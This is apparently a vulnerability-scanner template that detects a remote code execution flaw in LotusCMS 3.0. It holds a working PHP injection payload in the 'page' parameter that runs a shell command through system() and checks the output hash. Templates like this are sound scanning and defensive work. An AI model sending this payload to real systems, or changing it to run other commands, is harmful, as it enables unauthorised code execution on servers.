id: lotuscms-rce
info:
  name: LotusCMS 3.0 - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: LotusCMS 3.0 can be exploited through the 'page' parameter to execute
    remote code through the Router() function.
  reference:
  - https://github.com/Hood3dRob1n/LotusCMS-Exploit
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: lotuscms,rce
  metadata:
    impact: The impact of the vulnerability in LotusCMS 3.0's Router function is that
      it allows for remote code execution through embedding PHP code in the 'page'
      parameter, posing a significant security risk to the system.
    recommendation: It is recommended to update LotusCMS 3.0 to the latest version
      to mitigate the risk of remote code execution.
requests:
- method: POST
  path:
  - '{{BaseURL}}/index.php'
  - '{{BaseURL}}/lcms/index.php'
  headers:
    Content-Type: application/x-www-form-urlencoded
  body: 'page=index'');${system(''echo lotuscms_rce | md5sum'')};#

    '
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 38ee63071a04dc5e04ed22624c38e648
  - type: status
    status:
    - 200
